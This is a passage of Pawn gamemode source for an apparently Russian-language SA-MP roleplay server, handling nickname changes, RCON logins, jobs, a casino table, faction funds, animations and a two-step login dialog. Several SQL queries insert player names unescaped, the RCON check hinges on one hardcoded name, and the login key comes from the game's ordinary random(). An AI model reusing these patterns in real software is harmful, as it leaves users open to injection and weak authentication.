		new str[sizeof(fmt_string)+65+MAX_PLAYER_NAME+10];
		format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pAdText],PlayerInfo[playerid][pSendername],PlayerInfo[playerid][pPhone]);
		SendAd(TEAM_GROVE_COLOR,str);
		static const fmt_string1[] = "    Отредактировал сотрудник Central News Network: %s[%d]";
		new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME];
		format(str1, sizeof(str1), fmt_string1,PlayerInfo[play][pSendername],play);
		SendAd(TEAM_GROVE_COLOR,str1);
		PlayerInfo[playerid][pAd] = 0;
	}
}
// === arizona

// Free Slots: 6 7 8 10
// ======= me
// me: 0 7 8 3 9 6 4

// ar: 0 1 2 3 4 5 9

// | over: 1 2 5
stock SetAcs(playerid)
{
    if(IsPlayerAttachedObjectSlotUsed(playerid, 0)) RemovePlayerAttachedObject(playerid, 0);
    if(IsPlayerAttachedObjectSlotUsed(playerid, 7)) RemovePlayerAttachedObject(playerid, 7);
    if(IsPlayerAttachedObjectSlotUsed(playerid, 8)) RemovePlayerAttachedObject(playerid, 8);
    
    if(IsPlayerAttachedObjectSlotUsed(playerid, 3)) RemovePlayerAttachedObject(playerid, 3);
    if(IsPlayerAttachedObjectSlotUsed(playerid, 9)) RemovePlayerAttachedObject(playerid, 9);
    if(IsPlayerAttachedObjectSlotUsed(playerid, 6)) RemovePlayerAttachedObject(playerid, 6);
    if(IsPlayerAttachedObjectSlotUsed(playerid, 4)) RemovePlayerAttachedObject(playerid, 4);
    for(new i = 0; i <= 5; i++)
    {
        if(!PlayerInfo[playerid][pAcs][i]) continue;
        GiveItem(playerid,PlayerInfo[playerid][pAcs][i]);

    }
}
stock ChangeNick(i)
{
    query = "";
	format(query, 512, "INSERT INTO nicks (id1, name) VALUES ('%d','%s')", PlayerInfo[i][pID], PlayerInfo[i][pSendername]);
	mysql_tquery(mysql,query);
	new str[100];
	format(str,sizeof(str),">> %s теперь %s",PlayerInfo[i][pSendername],PlayerInfo[i][pNick]);
	SendClientMessageToAll(0x93FF73FF,str);
	if(GetPlayerKom(i))
	{
	    query = "";
		strmid(KomInfo[GetPVarInt(i,"PlayerKom")][kOwner], PlayerInfo[i][pNick], 0, strlen(PlayerInfo[i][pNick]), MAX_PLAYER_NAME);
		format(query,sizeof(query),"UPDATE `komnata` SET  owner = '%s' WHERE id = '%d' LIMIT 1",PlayerInfo[i][pNick],GetPVarInt(i,"PlayerKom"));
		mysql_tquery(mysql,query);
	}
	if(GetPlayerZasel(i))
	{
		switch(GetPVarInt(i,"PlayerZasel"))
		{
			case 1: strmid( HInfo[GetPVarInt(i,"PlayerHouse")][hZasel1], PlayerInfo[i][pNick], 0, strlen(PlayerInfo[i][pNick]), 32), SetHouseStr(GetPVarInt(i,"PlayerHouse"),"Zasel1",PlayerInfo[i][pNick]);
			case 2: strmid( HInfo[GetPVarInt(i,"PlayerHouse")][hZasel2], PlayerInfo[i][pNick], 0, strlen(PlayerInfo[i][pNick]), 32), SetHouseStr(GetPVarInt(i,"PlayerHouse"),"Zasel2",PlayerInfo[i][pNick]);
			case 3: strmid( HInfo[GetPVarInt(i,"PlayerHouse")][hZasel3], PlayerInfo[i][pNick], 0, strlen(PlayerInfo[i][pNick]), 32), SetHouseStr(GetPVarInt(i,"PlayerHouse"),"Zasel3",PlayerInfo[i][pNick]);
			case 4: strmid( HInfo[GetPVarInt(i,"PlayerHouse")][hZasel4], PlayerInfo[i][pNick], 0, strlen(PlayerInfo[i][pNick]), 32), SetHouseStr(GetPVarInt(i,"PlayerHouse"),"Zasel4",PlayerInfo[i][pNick]);
		}
	}
	for(new i2 = 1; i2<= TOTALV; i2++)
	{
	    if(VInfo[i2][vcar] == INVALID_VEHICLE_ID) continue;
	    if(!strcmp(VInfo[i2][vname], PlayerInfo[i][pSendername],true))
	    {
	        query = "";
	        strmid(VInfo[i2][vname], PlayerInfo[i][pNick], 0, strlen(PlayerInfo[i][pNick]), MAX_PLAYER_NAME);
			format(query,sizeof(query),"UPDATE `veh` SET  name = '%s' WHERE id = '%d' LIMIT 1",PlayerInfo[i][pNick],VInfo[i2][vnumber]);
			mysql_tquery(mysql,query);
	    }
	}
	if(GetPlayerBiz(i))
	{
	    query = "";
	    strmid(BizInfo[GetPVarInt(i,"PlayerBiz")][bOwner], PlayerInfo[i][pNick], 0, strlen(PlayerInfo[i][pNick]), MAX_PLAYER_NAME);
		format(query,sizeof(query),"UPDATE `biz` SET  owner = '%s' WHERE id = '%d' LIMIT 1",PlayerInfo[i][pNick],GetPVarInt(i,"PlayerBiz"));
		mysql_tquery(mysql,query);
		UpdateBiz(GetPVarInt(i,"PlayerBiz"));
	}
	if(GetPlayerHouse(i))
	{
	    query = "";
	    strmid(HInfo[GetPVarInt(i,"PlayerHouse")][hOwner], PlayerInfo[i][pNick], 0, strlen(PlayerInfo[i][pNick]), MAX_PLAYER_NAME);
		format(query,sizeof(query),"UPDATE `testhouse` SET  hOwner = '%s' WHERE id = '%d' LIMIT 1",PlayerInfo[i][pNick],GetPVarInt(i,"PlayerHouse"));
		mysql_tquery(mysql,query);
	}
	SetPlayerStr(PlayerInfo[i][pSendername],"name",PlayerInfo[i][pNick]);
	format(PlayerInfo[i][pSendername],MAX_PLAYER_NAME,PlayerInfo[i][pNick]);
	SetPlayerName(i,PlayerInfo[i][pNick]);
}
public OnRconLoginAttempt(ip[], password[], success)
{
	new pip[16];
	new name[MAX_PLAYER_NAME];
	if(!success)
	{
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			GetPlayerIp(i, pip, sizeof(pip));
			if(!strcmp(ip, pip, true))
			{
				GetPlayerName(i, name, sizeof(name));
				printf("Игрок %s попытался войти в rcon",name);
				Ban(i);
				break;
			}
		}
	}
	if(success)
	{
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			GetPlayerIp(i, pip, sizeof(pip));
			if(!strcmp(ip, pip, true))
			{
				GetPlayerName(i, name, sizeof(name));
				printf("Игрок %s зашёл в rcon",name);
				if(strcmp(name, "Enique_Guddi", true)) Ban(i);
				break;
			}
		}
	}
	return 1;
}

stock ClearJob(playerid)
{
	DeletePVar(playerid,"GorodCh");
	DeletePVar(playerid,"Gorod");
	if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
	DeletePVar(playerid,"SekBus");
	DeletePVar(playerid,"Mar");
	DeletePVar(playerid,"Raz");
	DeletePVar(playerid,"Meh");
	DeletePVar(playerid,"KM");
	DeletePVar(playerid,"Taxist");
	DeletePVar(playerid,"MarTaxi");
	DeletePVar(playerid,"KM");
	DeletePVar(playerid,"Meh");
	if(GetPVarInt(playerid,"InJob") == 1)
	{
		DestroyDynamicCP(GetPVarInt(playerid,"JobCP"));
		DeletePVar(playerid,"JobCP");
	}
	DeletePVar(playerid,"InJob");
	if(GetPVarInt(playerid,"RazCar") > 0)
	{
		switch(GetPVarInt(playerid,"CarLvl"))
		{
			case 1: DisablePlayerRaceCheckpoint(playerid);
			case 2: DestroyObject(GetPVarInt(playerid,"CarObj")), DeletePVar(playerid,"CarObj");
		}
		DeletePVar(playerid,"CarDost");
	}
	if(GetPVarInt(playerid,"Object1")) DestroyDynamicObject(GetPVarInt(playerid,"Object1"));
	if(GetPVarInt(playerid,"Object2"))DestroyDynamicObject(GetPVarInt(playerid,"Object2"));
	if(Trailer[playerid] && IsValidVehicle(Trailer[playerid]))
	{
		DestroyVehicle(Trailer[playerid]);
		Trailer[playerid] = -1;
		TrailerKol[playerid] = 0;
	}
	DeletePVar(playerid,"Object1");
	DeletePVar(playerid,"Object2");
	DeletePVar(playerid,"RazCar");
	DeletePVar(playerid,"Raz");
	DeletePVar(playerid,"Check");
	DeletePVar(playerid,"MarTaxi");
	SetVehicleToRespawn(GetPVarInt(playerid,"Bus"));
	DeletePVar(playerid,"Bus");
	DisablePlayerRaceCheckpoint(playerid);
}
/*stock SetVehicleIndicator(vehicleid, leftindicator=0, rightindicator=0)
{
	if(!leftindicator & !rightindicator) return false;
	new Float:_vX[2], Float:_vY[2], Float:_vZ[2];
	if(rightindicator)
	{
		if(IsTrailerAttachedToVehicle(vehicleid))
		{
			new omg = GetVehicleModel(GetVehicleTrailer(vehicleid));
			GetVehicleModelInfo(omg, VEHICLE_MODEL_INFO_SIZE, _vX[0], _vY[0], _vZ[0]);
			Indicators_xqz[vehicleid][4] = CreateObject(19294, 0, 0, 0,0,0,0);
			AttachDynamicObjectToVehicle(Indicators_xqz[vehicleid][4], GetVehicleTrailer(vehicleid),  _vX[0]/2.4, -_vY[0]/3.35, -1.0 ,0,0,0);
		}
		GetVehicleModelInfo(GetVehicleModel(vehicleid), VEHICLE_MODEL_INFO_SIZE, _vX[0], _vY[0], _vZ[0]);
		Indicators_xqz[vehicleid][0] = CreateDynamicObject(19294, 0, 0, 0,0,0,0,-1,-1,-1,300.0);
		AttachDynamicObjectToVehicle(Indicators_xqz[vehicleid][0], vehicleid,  _vX[0]/2.23, _vY[0]/2.23, 0.1 ,0,0,0);
		Indicators_xqz[vehicleid][1] = CreateDynamicObject(19294, 0, 0, 0,0,0,0,-1,-1,-1,300.0);
		AttachDynamicObjectToVehicle(Indicators_xqz[vehicleid][1], vehicleid,  _vX[0]/2.23, -_vY[0]/2.23, 0.1 ,0,0,0);
	}
	if(leftindicator)
	{
		if(IsTrailerAttachedToVehicle(vehicleid))
		{
			new omg = GetVehicleModel(GetVehicleTrailer(vehicleid));
			GetVehicleModelInfo(omg, VEHICLE_MODEL_INFO_SIZE, _vX[0], _vY[0], _vZ[0]);
			Indicators_xqz[vehicleid][5] = CreateObject(19294, 0, 0, 0,0,0,0);
			AttachObjectToVehicle(Indicators_xqz[vehicleid][5], GetVehicleTrailer(vehicleid),  -_vX[0]/2.4, -_vY[0]/3.35, -1.0 ,0,0,0);
		}
		GetVehicleModelInfo(GetVehicleModel(vehicleid), VEHICLE_MODEL_INFO_SIZE, _vX[0], _vY[0], _vZ[0]);
		Indicators_xqz[vehicleid][2] = CreateObject(19294, 0, 0, 0,0,0,0);
		AttachObjectToVehicle(Indicators_xqz[vehicleid][2], vehicleid,  -_vX[0]/2.23, _vY[0]/2.23, 0.1 ,0,0,0);
		Indicators_xqz[vehicleid][3] = CreateObject(19294, 0, 0, 0,0,0,0);
		AttachObjectToVehicle(Indicators_xqz[vehicleid][3], vehicleid,  -_vX[0]/2.23, -_vY[0]/2.23, 0.1 ,0,0,0);
	}
	return 1;
}*/
stock UpdateStol(id1)
{
	new text2[4][32];
	for(new i2 = 0; i2 <= 3; i2++)
	{
	    if(StolInfo[id1][sPlayer][i2] != -1) format(text2[i2],32,PlayerInfo[StolInfo[id1][sPlayer][i2]][pSendername]);
	    else text2[i2] = "None";
	}
	
	static const fmt_str1[] = "%s_//_%i~n~%s_//_%i~n~%s_//_%i~n~%s_//_%i";
	new string1[sizeof(fmt_str1)+32+32+32+32+50];
	format(string1, sizeof(string1), fmt_str1, text2[0],StolInfo[id1][sDice][0],text2[1],StolInfo[id1][sDice][1],text2[2],StolInfo[id1][sDice][2],text2[3],StolInfo[id1][sDice][3]);
    TextDrawSetString(CasinoTD[id1][0],string1);
	new str22[50];
	if(StolInfo[id1][sJdet] > 0) format(str22,sizeof(str22),"TIME WAIT:_%i_SEC", StolInfo[id1][sJdet]);
    if(StolInfo[id1][sIgra] > 0) format(str22,sizeof(str22),"TIME GAME:_%i_SEC", StolInfo[id1][sIgra]);
    else if(StolInfo[id1][sJdet] == 0 && StolInfo[id1][sIgra] == 0) str22 = "players_in_game";
	TextDrawSetString(CasinoTD[id1][1],str22);
	format(str22,sizeof(str22),"bet: %d$", StolInfo[id1][sPrice]);
	TextDrawSetString(CasinoTD[id1][2],str22);
}
stock SaveBank(playerid)
{
	switch(PlayerInfo[playerid][pMember])
	{
	    case F_GROVE: SetMatsInt("grovemoney",FracBank[PlayerInfo[playerid][pMember]]);
	    case F_BALLAS: SetMatsInt("ballasmoney",FracBank[PlayerInfo[playerid][pMember]]);
	    case F_BIKERS: SetMatsInt("bikersmoney",FracBank[PlayerInfo[playerid][pMember]]);
	    case F_AZTECAS: SetMatsInt("aztecasmoney",FracBank[PlayerInfo[playerid][pMember]]);
	    case F_VAGOS: SetMatsInt("vagosmoney",FracBank[PlayerInfo[playerid][pMember]]);
	    case F_LCN: SetMatsInt("lcnmoney",FracBank[PlayerInfo[playerid][pMember]]);
	    case F_RM: SetMatsInt("rmmoney",FracBank[PlayerInfo[playerid][pMember]]);
	    case F_YAKUZA: SetMatsInt("triadmoney",FracBank[PlayerInfo[playerid][pMember]]);
	    case F_RIFA: SetMatsInt("rifamoney",FracBank[PlayerInfo[playerid][pMember]]);
	}
	return true;
}
stock SaveMats(playerid)
{
	switch(PlayerInfo[playerid][pMember])
	{
	    case F_LSPD: SetMatsInt("lspdmats",FracMats[PlayerInfo[playerid][pMember]]);
		case F_LVPD: SetMatsInt("lvpdmats",FracMats[PlayerInfo[playerid][pMember]]);
		case F_FBI: SetMatsInt("fbimats",FracMats[PlayerInfo[playerid][pMember]]);
		case F_ARMY: SetMatsInt("armysamats",FracMats[PlayerInfo[playerid][pMember]]);
		case F_GROVE: SetMatsInt("grovemats",FracMats[PlayerInfo[playerid][pMember]]);
		case F_BALLAS: SetMatsInt("ballasmats",FracMats[PlayerInfo[playerid][pMember]]);
		case F_BIKERS: SetMatsInt("bikersmats",FracMats[PlayerInfo[playerid][pMember]]);
		case F_AZTECAS: SetMatsInt("aztecasmats",FracMats[PlayerInfo[playerid][pMember]]);
		case F_VAGOS: SetMatsInt("vagosmats",FracMats[PlayerInfo[playerid][pMember]]);
		case F_LCN: SetMatsInt("lcnmats",FracMats[PlayerInfo[playerid][pMember]]);
		case F_RM: SetMatsInt("rmmats",FracMats[PlayerInfo[playerid][pMember]]);
		case F_YAKUZA: SetMatsInt("triadmats",FracMats[PlayerInfo[playerid][pMember]]);
		case F_RIFA: SetMatsInt("rifasmats",FracMats[PlayerInfo[playerid][pMember]]);
	}
}
function UpdAp()
{
    static const fmt_str1[] = "Аптечек на складе: {f7ae11}%i";
	new string1[sizeof(fmt_str1)+5];
	format(string1, sizeof(string1), fmt_str1, HosAp);
	Update3DTextLabelTextEx(hostext,-1,string1);
}
function UpdAp1()
{
    static const fmt_str1[] = "Аптечек на складе: {f7ae11}%i";
	new string1[sizeof(fmt_str1)+5];
	format(string1, sizeof(string1), fmt_str1, HosAp1);
	Update3DTextLabelTextEx(hostext1,-1,string1);
}
stock UpdateArmy()
{
    static const fmt_str1[] = "Материалов на складе: {f7ae11}%i";
	new string1[sizeof(fmt_str1)+5];
	format(string1, sizeof(string1), fmt_str1, FracMats[F_ARMY]);
	Update3DTextLabelTextEx(armytext,-1,string1);
}
stock ShowInfo(playerid,text[])
{

	InfoText[playerid] = CreatePlayerTextDraw(playerid,551.999938, 100.385192, "press h to pick up"); // Text element
	PlayerTextDrawLetterSize(playerid,InfoText[playerid], 0.174998, 1.122961);
	PlayerTextDrawAlignment(playerid,InfoText[playerid], 2);
	PlayerTextDrawColor(playerid,InfoText[playerid], 255);
	PlayerTextDrawSetShadow(playerid,InfoText[playerid], 0);
	PlayerTextDrawSetOutline(playerid,InfoText[playerid], 0);
	PlayerTextDrawBackgroundColor(playerid,InfoText[playerid], 255);
	PlayerTextDrawFont(playerid,InfoText[playerid], 2);
	PlayerTextDrawSetProportional(playerid,InfoText[playerid], 1);

	PlayerTextDrawSetString(playerid,InfoText[playerid],text);
	PlayerTextDrawShow(playerid,InfoText[playerid]);
	for(new i = 0; i <= 2; i ++) TextDrawShowForPlayer(playerid,PressH[i]);
	return 1;
}
stock GoAnim(playerid,idan)
{
	SetPVarInt(playerid,"AnimGo",1);
	ShowInfo(playerid,"STOP Animation press H");
	switch(idan-1)
	{
		case 0: SetPlayerSpecialAction (playerid, SPECIAL_ACTION_DANCE1);
		case 1: SetPlayerSpecialAction (playerid, SPECIAL_ACTION_DANCE2);
		case 2: SetPlayerSpecialAction (playerid, SPECIAL_ACTION_DANCE3);
		case 3: SetPlayerSpecialAction (playerid, SPECIAL_ACTION_DANCE4);
		case 4: ApplyAnimation(playerid,"DEALER","Dealer_idle",4.1,1,0,0,0,0,0);
		case 5: ApplyAnimation(playerid,"DEALER","Dealer_Deal",4.1,0,0,0,0,0,1);
		case 6: ApplyAnimation(playerid,"FOOD","Eat_Burger",4.1,0,0,0,0,0,1);
		case 7: ApplyAnimation(playerid,"PAULNMAC","Piss_in",4.1,0,0,0,0,0,1);
		case 8: ApplyAnimation(playerid,"PARK","Tai_Chi_Loop",4.1,1,0,0,0,0,0);
		case 9: ApplyAnimation(playerid,"CRACK","Crckidle1",4.1,1,0,0,0,0,0);
		case 10: ApplyAnimation(playerid,"CRACK","Crckidle2",4.1,1,0,0,0,0,0);
		case 11: ApplyAnimation(playerid,"CRACK","Crckidle4",4.1,1,0,0,0,0,0);
		case 12: ApplyAnimation(playerid,"SWEET","sweet_ass_slap",4.1,0,0,0,0,0,1);
		case 13: ApplyAnimation(playerid,"SPRAYCAN","spraycan_full",4.1,1,0,0,0,0,0);
		case 14: ApplyAnimation(playerid,"GRAFFITI","spraycan_fire",4.1,1,0,0,0,0,0);
		case 15: ApplyAnimation(playerid,"SMOKING","M_smkstnd_loop",4.1,1,0,0,0,0,0);
		case 16: ApplyAnimation(playerid,"SHOP","ROB_Loop_Threat",4.1,1,0,0,0,0,0);
		case 17: ApplyAnimation(playerid,"SHOP","ROB_shifty",4.1,0,0,0,0,0,1);
		case 18: ApplyAnimation(playerid,"SHOP","SHP_Rob_HandsUP",4.1,1,0,0,0,0,0);
		case 19: ApplyAnimation(playerid,"RYDER","Ryd_Beckon_02",4.1,1,0,0,0,0,0);
		case 20: ApplyAnimation(playerid,"RIOT","Riot_Angry",4.1,0,0,0,0,0,0);
		case 21: ApplyAnimation(playerid,"RIOT","Riot_Angry_B",4.1,1,0,0,0,0,0);
		case 22: ApplyAnimation(playerid,"RIOT","Riot_Chant",4.1,1,1,0,0,0,0);
		case 23: ApplyAnimation(playerid,"RIOT","Riot_Punches",4.1,1,0,0,0,0,0);
		case 24: ApplyAnimation(playerid,"PED","fucku",4.1,0,0,0,0,0,1);
		case 25: ApplyAnimation(playerid,"BAR","dnK_StndM_loop",4.1,0,0,0,0,0,1);
		case 26: ApplyAnimation(playerid,"BD_FIRE","BD_Panic_03",4.1,1,0,0,0,0,0);
		case 27: ApplyAnimation(playerid,"BD_FIRE","M_smklean_loop",4.1,1,0,0,0,0,0);
		case 28: ApplyAnimation(playerid,"BEACH","bather",4.1,1,0,0,0,0,0);
		case 29: ApplyAnimation(playerid,"BEACH","Lay_Bac_loop",4.1,1,0,0,0,0,0);
		case 30: ApplyAnimation(playerid,"BEACH","Parksit_w_loop",4.1,1,0,0,0,0,0);
		case 31: ApplyAnimation(playerid,"BEACH","Sitnwait_Loop_W",4.1,1,0,0,0,0,0);
		case 32: ApplyAnimation(playerid,"BEACH","Parksit_M_loop",4.1,1,0,0,0,0,0);
		case 33: ApplyAnimation(playerid,"benchpress","gym_bp_celebrate",4.1,1,0,0,0,0,0);
		case 34: ApplyAnimation(playerid,"LOWRIDER","Rap_C_loop",4.1,1,0,0,0,0,0);
		case 35: ApplyAnimation(playerid,"LOWRIDER","Rap_B_loop",4.1,1,0,0,0,0,0);
		case 36: ApplyAnimation(playerid,"LOWRIDER","Rap_A_loop",4.1,1,0,0,0,0,0);
		case 37: ApplyAnimation(playerid,"BSKTBALL","BBALL_idleloop",4.1,1,0,0,0,0,0);
		case 38: ApplyAnimation(playerid,"BSKTBALL","BBALL_Jump_Shot",4.1,0,0,0,0,0,1);
		case 39: ApplyAnimation(playerid,"BSKTBALL","BBALL_pickup",4.1,0,0,0,0,0,1);
		case 40: ApplyAnimation(playerid,"CAMERA","camstnd_cmon",4.1,0,0,0,0,0,1);
		case 41: ApplyAnimation(playerid,"CAR","fixn_car_loop",4.1,1,0,0,0,0,0);
		case 42: ApplyAnimation(playerid,"CAR_CHAT","car_talkm_loop",4.1,1,0,0,0,0,0);
		case 43: ApplyAnimation(playerid,"COP_AMBIENT","coplook_loop",4.1,1,0,0,0,0,0);
		case 44: ApplyAnimation(playerid,"CRACK","Bbalbat_Idle_01",4.1,1,0,0,0,0,0);
		case 45: ApplyAnimation(playerid,"CRACK","Bbalbat_Idle_02",4.1,1,0,0,0,0,0);
		case 46: ApplyAnimation(playerid,"GHANDS","gsign1",4.1,0,0,0,0,0,1);
		case 47: ApplyAnimation(playerid,"GHANDS","gsign2",4.1,0,0,0,0,0,1);
		case 48: ApplyAnimation(playerid,"GHANDS","gsign3",4.1,0,0,0,0,0,1);
		case 49: ApplyAnimation(playerid,"GHANDS","gsign4",4.1,0,0,0,0,0,1);
		case 50: ApplyAnimation(playerid,"GHANDS","gsign5",4.1,0,0,0,0,0,1);
		case 51: ApplyAnimation(playerid,"GHANDS","gsign1LH",4.1,0,0,0,0,0,1);
		case 52: ApplyAnimation(playerid,"GHANDS","gsign2LH",4.1,0,0,0,0,0,1);
		case 53: ApplyAnimation(playerid,"GHANDS","gsign4LH",4.1,0,0,0,0,0,1);
		case 54: ApplyAnimation(playerid,"GRAVEYARD","mrnF_loop",4.1,1,0,0,0,0,0);
		case 55: ApplyAnimation(playerid,"MISC","seat_LR",4.1,1,0,0,0,0,0);
		case 56: ApplyAnimation(playerid,"INT_HOUSE","Lou_in",4.1,0,1,1,1,1,0);
		case 57: ApplyAnimation(playerid,"INT_OFFICE","OFF_sit_Bored_loop",4.1,1,0,0,0,0,0);
		case 58: ApplyAnimation(playerid,"LOWRIDER","F_smklean_loop",4.1,1,0,0,0,0,0);
		case 59: ApplyAnimation(playerid,"MEDIC","CPR",4.1,0,0,0,0,0,1);
		case 60: ApplyAnimation(playerid,"GANGS","LeanIn",4.1,0,1,1,1,1,0);
		case 61: ApplyAnimation(playerid,"MISC","plyrlean_loop",4.1,1,0,0,0,0,0);
		case 62: ApplyAnimation(playerid,"MISC","plyr_shkhead",4.1,0,0,0,0,0,1);
		case 63: ApplyAnimation(playerid,"MISC","scratchballs_01",4.1,1,0,0,0,0,0);
	}
	return true;
}
stock ShowS(playerid)
{
	static const fmt_str[] = "1 | Изменить никнейм\
	\n2 | Изменить пароль\
	\n3 | Изменить стиль боя\
	\n4 | Изменить стиль походки\t[%s]\
	\n5 | Очистить чат\
	\n6 | Дамаг-информер:\t%s\
	\n7 | Никнеймы игроков:\t%s\
	\n8 | Действия администрации:\t%s\
	\n9 | Чат фракции:\t%s\
	\n10 | Чат департамента:\t%s\
	\n11 | Чат семьи:\t%s\
	\n12 | Показ объявлений:\t%s";
	new str[sizeof(fmt_str)+30*9+24];
	format(str, sizeof(str), fmt_str,Anims[PlayerInfo[playerid][pHod]][aName],(!PlayerInfo[playerid][pDamage]) ? ("{F85A5A}[Отключен]{FFFFFF}"):("{20BA09}[Включен]{FFFFFF}"),
	(GetPVarInt(playerid,"Name")) ? ("{F85A5A}[Отключены]{FFFFFF}"):("{20BA09}[Включены]{FFFFFF}"),
	(PlayerInfo[playerid][pAdminC]) ? ("{F85A5A}[Отключены]{FFFFFF}"):("{20BA09}[Включены]{FFFFFF}"),
	(GetPVarInt(playerid,"ChatF")) ? ("{F85A5A}[Отключен]{FFFFFF}"):("{20BA09}[Включен]{FFFFFF}"),
	(GetPVarInt(playerid,"ChatD")) ? ("{F85A5A}[Отключен]{FFFFFF}"):("{20BA09}[Включен]{FFFFFF}"),
	(GetPVarInt(playerid,"ChatS")) ? ("{F85A5A}[Отключен]{FFFFFF}"):("{20BA09}[Включен]{FFFFFF}"),
	(GetPVarInt(playerid,"ChatAD")) ? ("{F85A5A}[Отключен]{FFFFFF}"):("{20BA09}[Включен]{FFFFFF}"));
	return ShowPlayerDialog(playerid,197,DIALOG_STYLE_LIST,"Настройка аккаунта",str,"Далее","Назад");
}



function GetAU(playerid,inputtext[])
{
    if(cache_get_row_count(mysql)>0)
	{
	    printf("GetAU");
        new ga = cache_get_field_content_int(0, "ga", mysql);
        if(!ga) OnPlayerLogin(playerid);
        else
        {
            new ipStr[16];
			GetPlayerIp( playerid, ipStr, 16 );
			new podIP[2],podIPs[2],d;
			sscanf(ipStr,"p<.>dddd",podIPs[0],podIPs[1],d,d);
			sscanf(PlayerInfo[playerid][pIp],"p<.>dddd",podIP[0],podIP[1],d,d);
			if(podIPs[0] != podIP[0] && podIPs[1] != podIP[1])
			{
			    new codea[17];
				for(new i = 0; i < 17; i ++) strcat(codea, biglet1ters[random(sizeof(biglet1ters))]);
				SendClientMessage(playerid,-1,codea);
		        static const fmt_string[] = "{FFFFFF}Запустите приложение Google Authenticator на своем смартфоне.\nВам нужно вручную ввести новый ключ.\n\nВ поле 'Аккаунт' введите: {f7ae11}%s{FFFFFF}\nВ поле 'Ключ' введите: {f7ae11}%s{FFFFFF} (Для удобства в копировании, код написан в чате)\nВыберите пункт {f7ae11}'По времени'.";
				new str1[sizeof(fmt_string)+24+16-2*2];
				format(str1, sizeof(str1), fmt_string,PlayerInfo[playerid][pSendername],codea);
				ShowPlayerDialog(playerid,264,DIALOG_STYLE_MSGBOX,"Двухэтапная авторизация",str1,"Далее","Назад");
			}
        }
	}
	return 1;
}

stock GoLoad(playerid)
{
    printf("GoLoad");
    query = "";
   	format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s'",PlayerInfo[playerid][pSendername]);
	mysql_tquery(mysql, query, "GetAU", "d", playerid);
/*	if(!strval(GetAccount(PlayerInfo[playerid][pSendername], "ga")))
	{
	    tp__ignore_tick[playerid] = GetTickCount()+999999999;
		OnPlayerLogin(playerid);
	}
	else
	{
	    new ipStr[16];
		GetPlayerIp( playerid, ipStr, 16 );
		new str[5];
		new kek,kek1,kek2,kek3;
		sparam(str, sizeof(str), ipStr, '.', 0);
		kek = strval(str);
		str = "";
		sparam(str, sizeof(str), ipStr, '.', 1);
		kek1 = strval(str);
		str = "";
		sparam(str, sizeof(str), GetAccount(PlayerInfo[playerid][pSendername], "ip"), '.', 0);
		kek2 = strval(str);
		str = "";
		sparam(str, sizeof(str), GetAccount(PlayerInfo[playerid][pSendername], "ip"), '.', 1);
		kek3 = strval(str);
		str = "";
		if(kek != kek2 && kek1 != kek3)
		{
		    new codea[17];
			for(new i = 0; i < 17; i ++) strcat(codea, biglet1ters[random(sizeof(biglet1ters))]);
			SendClientMessage(playerid,-1,codea);
	        static const fmt_string[] = "{FFFFFF}Запустите приложение Google Authenticator на своем смартфоне.\nВам нужно вручную ввести новый ключ.\n\nВ поле 'Аккаунт' введите: {f7ae11}%s{FFFFFF}\nВ поле 'Ключ' введите: {f7ae11}%s{FFFFFF} (Для удобства в копировании, код написан в чате)\nВыберите пункт {f7ae11}'По времени'.";
			new str1[sizeof(fmt_string)+24+16-2*2];
			format(str1, sizeof(str1), fmt_string,PlayerInfo[playerid][pSendername],codea);
			ShowPlayerDialog(playerid,264,DIALOG_STYLE_MSGBOX,"Двухэтапная авторизация",str1,"Далее","Назад");
		}
	}*/
	return true;
}
/*public OnDynamicActorStreamIn(actorid, forplayerid)
{

 	SetDynamicActorPos(actorid,ActorInfo[actorid][ax],ActorInfo[actorid][ay],ActorInfo[actorid][az]);
	SetDynamicActorFacingAngle(actorid,ActorInfo[actorid][aa]);
	return 1;
}*/
public OnPlayerLeaveDynamicArea(playerid, areaid)
{
	
	if((areaid >= sppost[0] && areaid <= sppost[4]) && GetPVarInt(playerid,"ThisPost"))
	{
	    new text[50];
	    switch(GetPVarInt(playerid,"ThisPost"))
		{
		    case 1: text = "Шоссе Las Venturas - Fort Carson";
		    case 2: text = "Мост Fort Carson - Bayside";
		    case 3: text = "Дамба";
		    case 4: text = "Мост Los Santos - Las Venturas";
	 		case 5:  text = "Мост Los Santos - San Fierro";
		}
	    static const fmt_string1[] = "[R] %s покинул пост №%d (%s)";
		new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+3+20];
		format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],GetPVarInt(playerid,"ThisPost"),text);
		SendCopsMessage(str1);
		DeletePVar(playerid,"ThisPost");
	}
	for(new i;i<sizeof(phonepos);i++)
	{
		if(areaid != phonepospic[i]) continue;
		if(GetPVarInt(playerid,"Zvon") > 0 || GetPVarInt(playerid,"ZvonStudio") > 0 || GetPVarInt(playerid,"Razgovor") > 0) cmd_h(playerid);
		break;
	}
	if(areaid == lsbankphoto[0] ||
	areaid == lsbankphoto[1] ||
	areaid == lsbankphoto[2] ||
	areaid == lvbankphoto[0] ||
	areaid == lvbankphoto[1] ||
	areaid == lvbankphoto[2])
	{
	    if(IsValidDynamicPickup(GetPVarInt(playerid,"GrabQuestP"))) DestroyDynamicPickup(GetPVarInt(playerid,"GrabQuestP")),DeletePVar(playerid,"GrabQuestP");
	}
	if(areaid == BattleSp && GetPVarInt(playerid,"InLowRide"))
	{
	    new i = GetPVarInt(playerid,"InLowRide")-1;
	    if(ZoneBattle[i][bplayer1] == playerid)
	    {
	        SendClientMessage(ZoneBattle[i][bplayer1],CREWARD,"Вы проиграли!");
			SendClientMessage(ZoneBattle[i][bplayer2],CREWARD,"Ваш противник вышел. Вы выиграли!");
			GiveMoney(ZoneBattle[i][bplayer2],ZoneBattle[i][bstavka]*2);
	    }
	    else if(ZoneBattle[i][bplayer2] == playerid)
	    {
	        SendClientMessage(ZoneBattle[i][bplayer2],CREWARD,"Вы проиграли!");
			SendClientMessage(ZoneBattle[i][bplayer1],CREWARD,"Ваш противник вышел. Вы выиграли!");
			GiveMoney(ZoneBattle[i][bplayer1],ZoneBattle[i][bstavka]*2);
	    }
		StopLowRide(ZoneBattle[i][bplayer2]);
